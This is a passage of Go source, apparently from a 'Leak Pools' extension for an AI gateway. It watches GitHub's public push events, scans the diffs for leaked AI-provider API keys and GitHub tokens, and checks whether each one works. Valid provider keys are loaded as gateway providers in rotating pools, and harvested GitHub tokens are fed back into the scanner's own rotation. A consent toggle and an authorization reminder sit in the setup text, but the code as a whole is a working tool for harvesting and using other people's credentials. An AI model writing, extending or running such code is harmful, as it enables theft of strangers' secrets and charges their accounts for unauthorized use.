// ---------------------------------------------------------------------------
// Naming and import
// ---------------------------------------------------------------------------

func choosePoolAndProvider(st *State, inv adminInventory, cfg config, svc serviceDef) (string, string) {
	basePool := sanitizeName(cfg.PoolPrefix + "-" + svc.ID)
	if basePool == "" {
		basePool = "leak-" + sanitizeName(svc.ID)
	}
	baseProvider := strings.ReplaceAll(basePool, "_", "-") + "-key"

	if cfg.PoolMode == "shared" {
		// Reuse the pool this extension already owns for this service.
		for i := range st.Pools {
			if st.Pools[i].Service != svc.ID {
				continue
			}
			poolName := st.Pools[i].Name
			providerName := uniqueProviderName(inv, baseProvider, len(st.Pools[i].Members)+1)
			return poolName, providerName
		}
		poolName := basePool
		for n := 2; ; n++ {
			if !inv.Pools[poolName] && managedPoolIndex(st, poolName) < 0 && !providerNameTaken(inv, poolName) {
				break
			}
			poolName = basePool + "_" + strconv.Itoa(n)
		}
		return poolName, uniqueProviderName(inv, baseProvider, 1)
	}

	// per_key: every distinct key gets its own pool, named _2, _3, … when the
	// base name is already taken.
	for n := 1; ; n++ {
		poolName := basePool
		providerName := baseProvider
		if n > 1 {
			poolName = basePool + "_" + strconv.Itoa(n)
			providerName = baseProvider + "-" + strconv.Itoa(n)
		}
		if inv.Pools[poolName] || managedPoolIndex(st, poolName) >= 0 {
			continue
		}
		if providerNameTaken(inv, poolName) {
			// A provider cannot share a name with a pool.
			continue
		}
		if providerNameTaken(inv, providerName) {
			providerName = uniqueProviderName(inv, providerName, n)
		}
		return poolName, providerName
	}
}

func uniqueProviderName(inv adminInventory, base string, n int) string {
	if !providerNameTaken(inv, base) {
		return base
	}
	for i := n; i < n+100; i++ {
		name := base + "-" + strconv.Itoa(i)
		if !providerNameTaken(inv, name) {
			return name
		}
	}
	return base + "-" + strconv.FormatInt(time.Now().UnixNano(), 10)
}

func importKey(cfg config, st *State, svc serviceDef, key string, models []string) (string, string, error) {
	if !svc.Importable {
		return "", "", fmt.Errorf("%s keys are not importable as providers", svc.Name)
	}
	hash := keyHash(svc.ID, key)
	if idx := managedKeyIndex(st, hash); idx >= 0 {
		return st.Keys[idx].Pool, st.Keys[idx].Provider, nil
	}

	inv, err := getInventory(cfg, true)
	if err != nil {
		return "", "", err
	}
	poolName, providerName := choosePoolAndProvider(st, inv, cfg, svc)
	if providerNameTaken(inv, providerName) {
		return "", "", fmt.Errorf("provider %q already exists", providerName)
	}
	poolManaged := managedPoolIndex(st, poolName) >= 0
	if inv.Pools[poolName] && !poolManaged {
		return "", "", fmt.Errorf("pool %q already exists and is not managed by this extension", poolName)
	}

	provider := providerPayload{
		Name:            providerName,
		Type:            svc.ProviderType,
		BaseURL:         svc.BaseURL,
		APIKey:          key,
		Models:          strings.Join(models, ", "),
		Enabled:         true,
		PoolOnly:        cfg.PoolOnly,
		AutoFetchModels: cfg.AutoFetchModels,
	}
	client := newAdminClient(cfg)
	if err := client.createProvider(provider); err != nil {
		return "", "", err
	}

	members := existingPoolMembers(st, poolName)
	if len(members) == 0 {
		members = []string{providerName}
	} else if !containsString(members, providerName) {
		members = append(members, providerName)
	}
	pool := poolPayload{
		Name:        poolName,
		Members:     members,
		Strategy:    "round_robin",
		HealthAware: true,
	}
	if inv.Pools[poolName] {
		if err := client.updatePool(poolName, pool); err != nil {
			// Roll the new provider back so the retry does not create a
			// duplicate under the next available name.
			rollbackProvider(client, providerName)
			return "", "", err
		}
	} else if err := client.createPool(pool); err != nil {
		rollbackProvider(client, providerName)
		return "", "", err
	}

	now := nowUTC()
	st.Keys = append(st.Keys, ManagedKey{
		Service:      svc.ID,
		KeyHash:      hash,
		Key:          key,
		ProviderType: svc.ProviderType,
		BaseURL:      svc.BaseURL,
		Provider:     providerName,
		Pool:         poolName,
		Models:       append([]string(nil), models...),
		Status:       "active",
		CreatedAt:    now,
	})
	updateManagedPool(st, poolName, svc.ID, members)
	st.Counters.Imported++
	invalidateInventory()
	return poolName, providerName, nil
}

func containsString(list []string, want string) bool {
	for _, v := range list {
		if v == want {
			return true
		}
	}
	return false
}

// rollbackProvider removes a provider whose pool step failed. The key stays
// pending and is retried on a later cycle, so a duplicate provider must not be
// left behind under the same key.
func rollbackProvider(client *adminClient, name string) {
	if err := client.deleteProvider(name); err == nil {
		invalidateInventory()
	}
}

func removeManagedKey(cfg config, st *State, idx int) error {
	if idx < 0 || idx >= len(st.Keys) {
		return nil
	}
	key := st.Keys[idx]
	client := newAdminClient(cfg)

	poolIdx := managedPoolIndex(st, key.Pool)
	if poolIdx >= 0 {
		members := poolMembersWithout(st, key.Pool, key.Provider)
		if len(members) == 0 {
			if err := client.deletePool(key.Pool); err != nil {
				return err
			}
			removeManagedPoolAt(st, poolIdx)
		} else {
			pool := poolPayload{
				Name:        key.Pool,
				Members:     members,
				Strategy:    "round_robin",
				HealthAware: true,
			}
			if err := client.updatePool(key.Pool, pool); err != nil {
				return err
			}
			st.Pools[poolIdx].Members = members
			st.Pools[poolIdx].UpdatedAt = nowUTC()
		}
	}

	if err := client.deleteProvider(key.Provider); err != nil {
		return err
	}
	removeManagedKeyAt(st, idx)
	st.Counters.Removed++
	invalidateInventory()
	return nil
}

// ---------------------------------------------------------------------------
// Validation / import cycle
// ---------------------------------------------------------------------------

func addFinding(st *State, f Finding) {
	idx := findingIndex(st, f.KeyHash)
	if idx >= 0 {
		st.Findings[idx].SeenCount++
		st.Findings[idx].CheckedAt = f.CheckedAt
		st.Findings[idx].Status = f.Status
		st.Findings[idx].Valid = f.Valid
		st.Findings[idx].Pool = f.Pool
		st.Findings[idx].Provider = f.Provider
		st.Findings[idx].Models = f.Models
		st.Findings[idx].Error = f.Error
		return
	}
	st.Findings = append(st.Findings, f)
	st.Findings = trimFindings(st.Findings)
}

func validateCandidates(dir string, cfg config, st *State, candidates []candidate) {
	if len(candidates) == 0 {
		return
	}
	budget := cfg.MaxImportsPerCycle
	seen := make(map[string]bool)
	for _, cand := range candidates {
		if seen[cand.KeyHash] {
			continue
		}
		seen[cand.KeyHash] = true
		if findingIndex(st, cand.KeyHash) >= 0 && managedKeyIndex(st, cand.KeyHash) >= 0 {
			continue
		}

		svc := serviceByID(cand.Service)
		if svc.ID == "" {
			continue
		}
		finding := Finding{
			Service:   svc.ID,
			Label:     cand.Label,
			KeyHash:   cand.KeyHash,
			KeyMask:   maskKey(cand.Key),
			Repo:      cand.Repo,
			File:      cand.File,
			Commit:    cand.Commit,
			Entropy:   cand.Entropy,
			FoundAt:   cand.FoundAt,
			CheckedAt: nowUTC(),
			SeenCount: 1,
		}

		// GitHub tokens go straight into the scanner pool, never into a
		// model-provider pool.
		if svc.ID == "github" {
			if !cfg.HarvestGitHubTokens {
				finding.Status = "ignored"
				addFinding(st, finding)
				continue
			}
			if !cfg.ValidateKeys {
				finding.Status = "unvalidated"
				addFinding(st, finding)
				continue
			}
			meta, err := validateGitHubToken(cfg, cand.Key)
			if err != nil {
				finding.Status = "invalid"
				finding.Error = truncate(err.Error(), maxBodySnippet)
				addFinding(st, finding)
				st.Counters.Validated++
				continue
			}
			addGitHubTokenToState(st, cand.Key, meta, tokenSourceHarvest)
			finding.Valid = true
			finding.Status = "github-pool"
			if githubTokenKind(cand.Key) == kindAppInstall {
				finding.Status = "github-unsupported"
				finding.Error = "installation tokens cannot read the user events feed"
			}
			addFinding(st, finding)
			st.Counters.Validated++
			continue
		}

		if !cfg.ValidateKeys {
			finding.Status = "unvalidated"
			addFinding(st, finding)
			continue
		}

		res := validateKey(cfg, svc, cand.Key)
		finding.Error = res.Error
		finding.Models = len(res.Models)
		finding.Valid = res.Status == "valid"
		st.Counters.Validated++

		switch res.Status {
		case "valid":
			if !cfg.CreatePools {
				finding.Status = "valid"
				addFinding(st, finding)
				continue
			}
			if !cfg.Services[svc.ID] {
				finding.Status = "valid-disabled"
				addFinding(st, finding)
				continue
			}
			if !svc.Importable || !cand.Importable {
				// Credentials the gateway cannot use as a plain provider key
				// are still reported, but never imported. This covers
				// organization admin keys and Anthropic OAuth tokens.
				if svc.ID == "openai" && strings.HasPrefix(cand.Key, "sk-admin-") {
					finding.Status = "valid-admin-key"
				} else {
					finding.Status = "valid-not-importable"
				}
				addFinding(st, finding)
				continue
			}
			if budget <= 0 {
				finding.Status = "queued"
				addFinding(st, finding)
				enqueuePending(st, cand)
				continue
			}
			pool, provider, err := importKey(cfg, st, svc, cand.Key, res.Models)
			if err != nil {
				finding.Status = "import-error"
				finding.Error = truncate(err.Error(), maxBodySnippet)
				addFinding(st, finding)
				enqueuePending(st, cand)
				continue
			}
			budget--
			finding.Status = "imported"
			finding.Pool = pool
			finding.Provider = provider
			addFinding(st, finding)
		case "invalid":
			finding.Status = "invalid"
			addFinding(st, finding)
		case "limited":
			finding.Status = "limited"
			addFinding(st, finding)
			enqueuePending(st, cand)
		default:
			finding.Status = "error"
			addFinding(st, finding)
			enqueuePending(st, cand)
		}
	}
}

func enqueuePending(st *State, cand candidate) {
	if cand.Key == "" || pendingIndex(st, cand.KeyHash) >= 0 {
		return
	}
	st.Pending = append(st.Pending, PendingKey{
		Service: cand.Service,
		Label:   cand.Label,
		Key:     cand.Key,
		KeyHash: cand.KeyHash,
		Repo:    cand.Repo,
		File:    cand.File,
		Commit:  cand.Commit,
		Entropy: cand.Entropy,
		AddedAt: nowUTC(),
	})
	st.Pending = trimPending(st.Pending)
}

func processPending(cfg config, st *State) {
	if len(st.Pending) == 0 {
		return
	}
	budget := cfg.MaxImportsPerCycle
	keep := make([]PendingKey, 0, len(st.Pending))
	for _, p := range st.Pending {
		if budget <= 0 {
			keep = append(keep, p)
			continue
		}
		svc := serviceByID(p.Service)
		if svc.ID == "" || !svc.Importable {
			continue
		}
		if managedKeyIndex(st, p.KeyHash) >= 0 {
			continue
		}
		res := validateKey(cfg, svc, p.Key)
		if res.Status == "invalid" {
			st.Counters.Errors++
			continue
		}
		if res.Status != "valid" {
			p.Attempts++
			p.LastErr = truncate(res.Error, 160)
			keep = append(keep, p)
			continue
		}
		pool, provider, err := importKey(cfg, st, svc, p.Key, res.Models)
		if err != nil {
			p.Attempts++
			p.LastErr = truncate(err.Error(), 160)
			keep = append(keep, p)
			continue
		}
		budget--
		finding := Finding{
			Service: svc.ID, Label: p.Label, KeyHash: p.KeyHash,
			KeyMask: maskKey(p.Key), Repo: p.Repo, File: p.File, Commit: p.Commit,
			Entropy: p.Entropy, Valid: true, Status: "imported",
			Pool: pool, Provider: provider, Models: len(res.Models),
			FoundAt: p.AddedAt, CheckedAt: nowUTC(), SeenCount: 1,
		}
		addFinding(st, finding)
	}
	st.Pending = keep
}

func revalidateManagedKeys(cfg config, st *State) {
	if time.Since(st.LastRevalidate) < cfg.Revalidate {
		return
	}
	st.LastRevalidate = nowUTC()
	// Iterate backwards because removal mutates the slice.
	for i := len(st.Keys) - 1; i >= 0; i-- {
		key := &st.Keys[i]
		svc := serviceByID(key.Service)
		if svc.ID == "" {
			continue
		}
		key.LastCheck = nowUTC()
		if !cfg.ValidateKeys {
			key.Status = "unvalidated"
			continue
		}
		res := validateKey(cfg, svc, key.Key)
		switch res.Status {
		case "valid":
			key.Status = "active"
			key.Failures = 0
			key.LastError = ""
			if len(res.Models) > 0 {
				key.Models = res.Models
				client := newAdminClient(cfg)
				_ = client.updateProvider(key.Provider, providerPatch{Models: strings.Join(res.Models, ", ")})
			}
		case "invalid":
			key.Status = "dead"
			key.Failures++
			key.LastError = res.Error
			if cfg.DeleteDead {
				if err := removeManagedKey(cfg, st, i); err != nil {
					key.LastError = truncate(err.Error(), 200)
				}
			}
		case "limited":
			key.Status = "limited"
			key.Failures++
			key.LastError = res.Error
		default:
			key.Status = "error"
			key.Failures++
			key.LastError = res.Error
		}
	}
}

// ---------------------------------------------------------------------------
// GitHub scanning
// ---------------------------------------------------------------------------

func pollGitHub(cfg config, st *State) {
	if time.Since(st.LastPoll) < cfg.PollInterval {
		return
	}
	st.LastPoll = nowUTC()

	if len(st.GitHubTokens) == 0 {
		st.LastError = "no GitHub token: add one in the extension settings (classic PAT with no scopes is enough)"
		return
	}
	idx := pickGitHubToken(st, cfg)
	if idx < 0 && !cfg.AllowAnonymous {
		st.LastError = "all GitHub tokens are exhausted or quarantined"
		return
	}

	headers := githubHeaders("")
	if idx >= 0 {
		headers = githubHeaders(st.GitHubTokens[idx].Token)
	}
	if strings.TrimSpace(st.ETag) != "" {
		headers["If-None-Match"] = st.ETag
	}
	target := fmt.Sprintf("%s/events?per_page=%d", cfg.GitHubAPI, cfg.PerPage)
	res := doHTTP(http.MethodGet, target, headers, nil, cfg.RequestTimeout)
	if idx >= 0 {
		reportGitHubToken(st, idx, res)
	}
	if res.Err != nil {
		st.LastError = "GitHub events: " + truncate(res.Err.Error(), 200)
		st.Counters.Errors++
		return
	}
	if res.Status == http.StatusNotModified {
		st.LastError = ""
		return
	}
	if res.Status != http.StatusOK {
		st.LastError = fmt.Sprintf("GitHub events: HTTP %d: %s", res.Status, truncate(bodyText(res), 160))
		st.Counters.Errors++
		return
	}
	var events []ghEvent
	if err := json.Unmarshal(res.Body, &events); err != nil {
		st.LastError = "GitHub events: invalid JSON: " + err.Error()
		st.Counters.Errors++
		return
	}

	seen := make(map[string]bool, len(st.SeenEvents))
	for _, id := range st.SeenEvents {
		seen[id] = true
	}

	var candidates []candidate
	pushes := 0
	budgetHit := false
	for i := len(events) - 1; i >= 0; i-- {
		ev := events[i]
		if ev.ID != "" && seen[ev.ID] {
			continue
		}
		if ev.Type != "PushEvent" {
			markEventSeen(st, seen, ev.ID)
			st.Counters.EventsSeen++
			continue
		}
		if pushes >= cfg.MaxPushesPerCycle {
			// Leave this and every newer event unmarked so the next poll
			// retries them instead of dropping them for good.
			budgetHit = true
			break
		}
		out, attempted := processPush(cfg, st, ev)
		if !attempted {
			budgetHit = true
			break
		}
		markEventSeen(st, seen, ev.ID)
		st.Counters.EventsSeen++
		pushes++
		candidates = append(candidates, out...)
	}
	if budgetHit {
		// Do not keep the ETag: a conditional request would answer 304 and
		// the unprocessed events would never be visited.
		st.ETag = ""
	} else if etag := res.Header.Get("ETag"); etag != "" {
		st.ETag = etag
	}
	st.SeenEvents = trimSeen(st.SeenEvents)
	if len(candidates) > 0 {
		st.Counters.Candidates += int64(len(candidates))
		validateCandidates(activeDir(), cfg, st, candidates)
	}
	st.LastError = ""
}

// processPush returns the candidates found in one push and whether the event
// was actually attempted. A false second result means no token was available:
// the caller must leave the event unseen so the next poll can retry it.
// Pushes skipped for a normal reason (bot actor, zero-size, malformed) are
// attempted=true because retrying them would only waste quota.
func processPush(cfg config, st *State, ev ghEvent) ([]candidate, bool) {
	actor := strings.ToLower(strings.TrimSpace(ev.Actor.Login))
	if strings.HasSuffix(actor, "[bot]") || actor == "dependabot" || actor == "renovate" || actor == "github-actions" {
		return nil, true
	}
	before := strings.TrimSpace(ev.Payload.Before)
	head := strings.TrimSpace(ev.Payload.Head)
	if before == "" || head == "" {
		return nil, true
	}
	if strings.HasPrefix(before, "00000000") || strings.HasPrefix(head, "00000000") || ev.Payload.Size == 0 {
		return nil, true
	}
	repo := strings.TrimSpace(ev.Repo.Name)
	if repo == "" {
		return nil, true
	}

	idx := pickGitHubToken(st, cfg)
	if idx < 0 && !cfg.AllowAnonymous {
		return nil, false
	}
	headers := githubHeaders("")
	if idx >= 0 {
		headers = githubHeaders(st.GitHubTokens[idx].Token)
	}
	target := fmt.Sprintf("%s/repos/%s/compare/%s...%s", cfg.GitHubAPI, repo, before, head)
	res := doHTTP(http.MethodGet, target, headers, nil, cfg.RequestTimeout)
	if idx >= 0 {
		reportGitHubToken(st, idx, res)
	}
	if res.Err != nil || res.Status != http.StatusOK {
		return nil, true
	}
	st.Counters.DiffsFetched++

	var cmp ghCompare
	if err := json.Unmarshal(res.Body, &cmp); err != nil {
		return nil, true
	}
	commitURL := cmp.HTMLURL
	if commitURL == "" {
		commitURL = fmt.Sprintf("https://github.com/%s/compare/%s...%s", repo, before, head)
	}
	var out []candidate
	for _, file := range cmp.Files {
		if strings.TrimSpace(file.Patch) == "" {
			continue
		}
		if !allowedFile(file.Filename) {
			continue
		}
		out = append(out, scanPatch(cfg, file.Filename, file.Patch, repo, commitURL)...)
	}
	st.Counters.PushesScanned++
	return out, true
}

func allowedFile(name string) bool {
	fname := strings.ToLower(strings.TrimSpace(name))
	if strings.Contains(fname, ".env") {
		return true
	}
	ext := strings.ToLower(filepath.Ext(fname))
	return allowedExtensions[ext]
}

func scanPatch(cfg config, filename, patch, repo, commitURL string) []candidate {
	var out []candidate
	seen := make(map[string]bool)
	fnameLower := strings.ToLower(filename)
	for _, line := range strings.Split(patch, "\n") {
		if !strings.HasPrefix(line, "+") || strings.HasPrefix(line, "+++") {
			continue
		}
		content := strings.TrimSpace(line[1:])
		if content == "" || len(content) > maxScanLine {
			continue
		}
		lower := strings.ToLower(content)
		for _, cp := range compiledPatterns {
			matches := cp.RE.FindAllString(content, -1)
			for _, key := range matches {
				if len(key) < 32 || seen[key] {
					continue
				}
				if isHexOnly(key) && len(key) >= 40 {
					continue
				}
				entropy := calculateEntropy(key)
				if cp.Def.Service == "deepseek" {
					hasContext := strings.Contains(lower, "deepseek") || strings.Contains(fnameLower, "deepseek")
					if !hasContext {
						if entropy < 3.65 || strings.Contains(key, "0123456789") || strings.Contains(strings.ToLower(key), "abcdef") {
							continue
						}
					} else if entropy < 3.2 {
						continue
					}
				} else if entropy < cfg.MinEntropy {
					continue
				}
				if isPlaceholder(key) {
					continue
				}
				seen[key] = true
				out = append(out, candidate{
					Service:    cp.Def.Service,
					Label:      cp.Def.Label,
					Key:        key,
					KeyHash:    keyHash(cp.Def.Service, key),
					Repo:       repo,
					File:       filename,
					Commit:     commitURL,
					Entropy:    entropy,
					FoundAt:    nowUTC(),
					Importable: cp.Def.Importable,
				})
			}
		}
	}
	return out
}

func calculateEntropy(s string) float64 {
	if len(s) < 20 {
		return 0.0
	}
	counts := make(map[rune]int)
	for _, r := range s {
		counts[r]++
	}
	total := float64(len(s))
	var sum float64
	for _, c := range counts {
		p := float64(c) / total
		if p > 0 {
			sum -= p * math.Log2(p)
		}
	}
	return sum
}

func isHexOnly(s string) bool {
	for _, r := range s {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')) {
			return false
		}
	}
	return true
}

func isPlaceholder(key string) bool {
	body := key
	if i := strings.Index(body, "_"); i >= 0 && i < 12 {
		body = body[i+1:]
	}
	if len(body) < 16 {
		return false
	}
	allSame := true
	for i := 1; i < len(body); i++ {
		if body[i] != body[0] {
			allSame = false
			break
		}
	}
	if allSame {
		return true
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, "0123456789") || strings.Contains(lower, "1234567890") {
		return true
	}
	if strings.Contains(lower, "your_api_key") || strings.Contains(lower, "your-key") || strings.Contains(lower, "example") {
		return true
	}
	return false
}

// ---------------------------------------------------------------------------
// Reconcile
// ---------------------------------------------------------------------------

func reconcile(cfg config, st *State) {
	if time.Since(st.LastReconcile) < cfg.Reconcile {
		return
	}
	st.LastReconcile = nowUTC()
	inv, err := getInventory(cfg, true)
	if err != nil {
		st.LastError = "reconcile: " + truncate(err.Error(), 160)
		return
	}
	// Respect operator deletions: if a provider or pool this extension created
	// is gone from the gateway, drop the matching state instead of recreating
	// it behind the operator's back.
	for i := len(st.Keys) - 1; i >= 0; i-- {
		key := st.Keys[i]
		if providerNameTaken(inv, key.Provider) {
			continue
		}
		removeManagedKeyAt(st, i)
	}
	for i := len(st.Pools) - 1; i >= 0; i-- {
		if inv.Pools[st.Pools[i].Name] {
			continue
		}
		removeManagedPoolAt(st, i)
	}
	// Drop pool members that no longer have a managed key.
	for i := range st.Pools {
		var members []string
		for _, m := range st.Pools[i].Members {
			found := false
			for _, k := range st.Keys {
				if k.Provider == m {
					found = true
					break
				}
			}
			if found {
				members = append(members, m)
			}
		}
		st.Pools[i].Members = members
	}
}

// ---------------------------------------------------------------------------
// Cycle + hooks
// ---------------------------------------------------------------------------

func acquireCycle() bool {
	select {
	case cycleGate <- struct{}{}:
		return true
	default:
		return false
	}
}

func releaseCycle() {
	select {
	case <-cycleGate:
	default:
	}
}

func triggerCycle(dir string, cfg config) {
	if !cfg.Enabled || !cfg.LegalAck {
		return
	}
	if !acquireCycle() {
		return
	}
	go func() {
		defer releaseCycle()
		runCycleNow(dir, cfg)
	}()
}

func runCycle(dir string, cfg config) {
	if !acquireCycle() {
		return
	}
	defer releaseCycle()
	runCycleNow(dir, cfg)
}

// maintainGitHubTokenSettings applies the no-network part of the token
// reconciliation (settings ownership, legacy migration, forget switch). It is
// used while scanning is disabled, where a full cycle never runs.
func maintainGitHubTokenSettings(dir string, cfg config) {
	if strings.TrimSpace(dir) == "" {
		dir = activeDir()
	}
	st := loadState(dir)
	if !reconcileGitHubTokenSettings(&st, cfg) {
		return
	}
	if err := saveState(dir, &st); err != nil {
		fmt.Println("[leak-pools] state save failed:", err)
	}
}

func runCycleNow(dir string, cfg config) {
	if !cfg.Enabled || !cfg.LegalAck {
		return
	}
	if strings.TrimSpace(dir) == "" {
		dir = activeDir()
	}
	st := loadState(dir)
	st.LastCycle = nowUTC()

	addBootstrapGitHubTokens(&st, cfg)
	processPending(cfg, &st)
	revalidateManagedKeys(cfg, &st)
	pollGitHub(cfg, &st)
	reconcile(cfg, &st)

	if err := saveState(dir, &st); err != nil {
		fmt.Println("[leak-pools] state save failed:", err)
	}
}

func parsePayload(raw string) hookPayload {
	var p hookPayload
	_ = json.Unmarshal([]byte(raw), &p)
	return p
}

func hookStart(raw string) string {
	p := parsePayload(raw)
	dir := strings.TrimSpace(p.Dir)
	if dir == "" {
		dir = deriveStateDir()
	}
	setActiveDir(dir)
	ensureStarted(dir)
	cfg := loadConfigFromStore()
	maintainGitHubTokenSettings(dir, cfg)
	if cfg.Enabled && cfg.LegalAck {
		triggerCycle(dir, cfg)
	}
	return mustJSON(map[string]interface{}{"ok": true, "dir": dir})
}

func OnInit(raw string) string         { return hookStart(raw) }
func OnApply(raw string) string        { return hookStart(raw) }
func OnSettingsSave(raw string) string { return hookStart(raw) }
func OnUnapply(raw string) string {
	return `{"ok":true}`
}

func OnTick(raw string) string {
	p := parsePayload(raw)
	dir := strings.TrimSpace(p.Dir)
	if dir == "" {
		dir = activeDir()
	}
	cfg := configFromPayload(p)
	if cfg.Enabled && cfg.LegalAck {
		triggerCycle(dir, cfg)
	}
	return `{"ok":true}`
}

func Data(raw string) string {
	p := parsePayload(raw)
	dir := strings.TrimSpace(p.Dir)
	if dir == "" {
		dir = activeDir()
	}
	setActiveDir(dir)
	ensureStarted(dir)
	cfg := configFromPayload(p)
	key := strings.ToLower(strings.TrimSpace(p.Key))
	st := loadState(dir)

	switch key {
	case "", "status":
		return statusPayload(cfg, &st)
	case "setup":
		return setupPayload(cfg, &st)
	case "findings":
		return findingsPayload(cfg, &st)
	case "pools":
		return poolsPayload(cfg, &st)
	case "github":
		return githubPayload(cfg, &st)
	case "services":
		return servicesPayload(cfg, &st)
	default:
		return mustJSON(map[string]interface{}{
			"blocks": []interface{}{
				map[string]interface{}{"kind": "text", "text": "Unknown data key: " + key},
			},
		})
	}
}

// ---------------------------------------------------------------------------
// Dashboard payloads
// ---------------------------------------------------------------------------

func statusPayload(cfg config, st *State) string {
	tokens, active, accounts, remaining := activeGitHubStats(st)
	valid := 0
	imported := 0
	dead := 0
	for _, f := range st.Findings {
		if f.Valid {
			valid++
		}
	}
	for _, k := range st.Keys {
		if k.Status == "dead" {
			dead++
		} else {
			imported++
		}
	}
	state := "disabled"
	if cfg.Enabled && cfg.LegalAck {
		state = "running"
	} else if cfg.Enabled && !cfg.LegalAck {
		state = "consent required"
	}

	next := "—"
	if cfg.Enabled && !st.LastPoll.IsZero() {
		next = formatTime(st.LastPoll.Add(cfg.PollInterval))
	}

	stats := []map[string]string{
		{"k": "Scanner", "v": state},
		{"k": "Findings", "v": strconv.Itoa(len(st.Findings))},
		{"k": "Valid", "v": strconv.Itoa(valid)},
		{"k": "Imported keys", "v": strconv.Itoa(imported)},
		{"k": "Pools", "v": strconv.Itoa(len(st.Pools))},
		{"k": "GitHub tokens", "v": fmt.Sprintf("%d active / %d", active, tokens)},
	}
	kv := []map[string]string{
		{"k": "Last cycle", "v": formatTime(st.LastCycle)},
		{"k": "Last GitHub poll", "v": formatTime(st.LastPoll)},
		{"k": "Next poll", "v": next},
		{"k": "GitHub accounts", "v": strconv.Itoa(accounts)},
		{"k": "GitHub quota left", "v": strconv.Itoa(remaining)},
		{"k": "Dead keys", "v": strconv.Itoa(dead)},
		{"k": "Admin API", "v": cfg.AdminURL},
		{"k": "Pool mode", "v": cfg.PoolMode},
		{"k": "Last error", "v": orDash(truncate(st.LastError, 220))},
	}
	blocks := []interface{}{
		map[string]interface{}{"kind": "kv", "kv": kv},
	}
	if !cfg.LegalAck {
		blocks = append(blocks, map[string]interface{}{"kind": "text", "text": "Scanning is paused until legal_ack is enabled in Settings → Extensions → Leak Pools."})
	}
	if len(st.Pending) > 0 {
		blocks = append(blocks, map[string]interface{}{
			"kind": "text",
			"text": fmt.Sprintf("%d key(s) are queued for import retry.", len(st.Pending)),
		})
	}
	return mustJSON(map[string]interface{}{"stats": stats, "kv": kv, "blocks": blocks})
}

func setupPayload(cfg config, st *State) string {
	adminState := testAdmin(cfg)
	githubConfigured := strings.TrimSpace(cfg.GitHubToken) != "" || strings.TrimSpace(cfg.GitHubTokens) != ""
	tokens, active, accounts, remaining := activeGitHubStats(st)

	steps := []string{
		"1. Read the authorization note and enable legal_ack only if you may test the keys this scanner finds.",
		"2. Paste a GitHub token below. A classic PAT (ghp_…) with no scopes is enough for public events and compare calls; 5,000 requests/hour per GitHub account.",
		"3. Fine-grained PATs (github_pat_…) also work. No repository permissions are needed for public events; add Contents: Read only if you also want private-repository coverage.",
		"4. OAuth (gho_) and app user (ghu_) tokens are accepted and grouped by account; tokens from one account share one hourly budget and different accounts add 5,000 each. Installation tokens (ghs_) are recognized but marked unsupported because the events feed is user-scoped, not app-scoped.",
		"5. Create a token at GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic) → Generate new token. Leave every scope unchecked for public scanning.",
		"6. Keep create_pools on if the extension should create the pool for each supported provider automatically (the first valid key creates it; there are no empty pools in AuroraX).",
		"7. Pick the services to import. Distinct keys for one service get alternative pools: leak-openai, leak-openai_2, leak-openai_3, …",
		"8. Enable scanning. The Setup tab and the Leak Pools page update from the local state file; no Telegram or webhook is used.",
	}

	kv := []map[string]string{
		{"k": "Legal acknowledgment", "v": boolLabel(cfg.LegalAck)},
		{"k": "Scanning enabled", "v": boolLabel(cfg.Enabled)},
		{"k": "Admin API", "v": cfg.AdminURL + " (" + adminState + ")"},
		{"k": "Admin key source", "v": adminKeySource(cfg)},
		{"k": "Create pools", "v": boolLabel(cfg.CreatePools)},
		{"k": "Pool mode", "v": cfg.PoolMode},
		{"k": "Pool prefix", "v": cfg.PoolPrefix},
		{"k": "GitHub token field", "v": boolLabel(githubConfigured)},
		{"k": "GitHub tokens in pool", "v": fmt.Sprintf("%d active / %d total", active, tokens)},
		{"k": "GitHub accounts", "v": strconv.Itoa(accounts)},
		{"k": "GitHub quota left", "v": strconv.Itoa(remaining)},
	}

	var services []string
	for _, svc := range serviceDefs {
		if svc.ID == "github" {
			continue
		}
		enabled := cfg.Services[svc.ID]
		keys := 0
		for _, k := range st.Keys {
			if k.Service == svc.ID && k.Status != "dead" {
				keys++
			}
		}
		pools := 0
		for _, p := range st.Pools {
			if p.Service == svc.ID {
				pools++
			}
		}
		services = append(services, fmt.Sprintf(
			"%s — import %s, %d key(s), %d pool(s). %s",
			svc.Name, enabledLabel(enabled), keys, pools, svc.Hint))
	}

	blocks := []interface{}{
		map[string]interface{}{"kind": "heading", "text": "First-time setup"},
		map[string]interface{}{"kind": "text", "text": "This addon scans GitHub public push events for provider API keys, validates them, and creates AuroraX providers and pools. It is a credential scanner: use it only where you have authorization."},
		map[string]interface{}{"kind": "kv", "kv": kv},
		map[string]interface{}{"kind": "divider"},
		map[string]interface{}{"kind": "heading", "text": "GitHub token — what to create"},
		map[string]interface{}{"kind": "list", "items": []string{
			"Recommended: classic personal access token (ghp_…). No scopes are required for public /events and /compare calls — leave all checkboxes empty. Each GitHub account gets 5,000 requests/hour.",
			"Fine-grained personal access token (github_pat_…): no repository permissions for public events. Add Contents: Read only if you want the scanner to read private repositories as well.",
			"OAuth (gho_…) and GitHub App user (ghu_…) tokens are accepted and grouped by account, so two tokens from one account share the account budget instead of duplicating it. Installation tokens (ghs_…) are recognized but stay out of the rotation: the events feed is user-scoped.",
			"Add more tokens later in github_tokens (one per line). The scanner rotates them, quarantines rate-limited ones and revives them when the window resets.",
			"The token is stored in the extension config and is only sent to api.github.com.",
		}},
		map[string]interface{}{"kind": "divider"},
		map[string]interface{}{"kind": "heading", "text": "Steps"},
		map[string]interface{}{"kind": "list", "items": steps},
		map[string]interface{}{"kind": "divider"},
		map[string]interface{}{"kind": "heading", "text": "Supported services"},
		map[string]interface{}{"kind": "list", "items": services},
	}
	return mustJSON(map[string]interface{}{"blocks": blocks})
}

func findingsPayload(cfg config, st *State) string {
	items := make([]string, 0, maxListItems)
	for i := len(st.Findings) - 1; i >= 0 && len(items) < maxListItems; i-- {
		f := st.Findings[i]
		line := fmt.Sprintf("%s | %s | %s | %s | %s/%s",
			formatTime(f.FoundAt), serviceName(f.Service), f.KeyMask, f.Status, f.Repo, f.File)
		if f.Pool != "" {
			line += " → " + f.Pool
		}
		if f.Error != "" {
			line += " | " + truncate(f.Error, 90)
		}
		items = append(items, line)
	}
	blocks := []interface{}{}
	if len(items) == 0 {
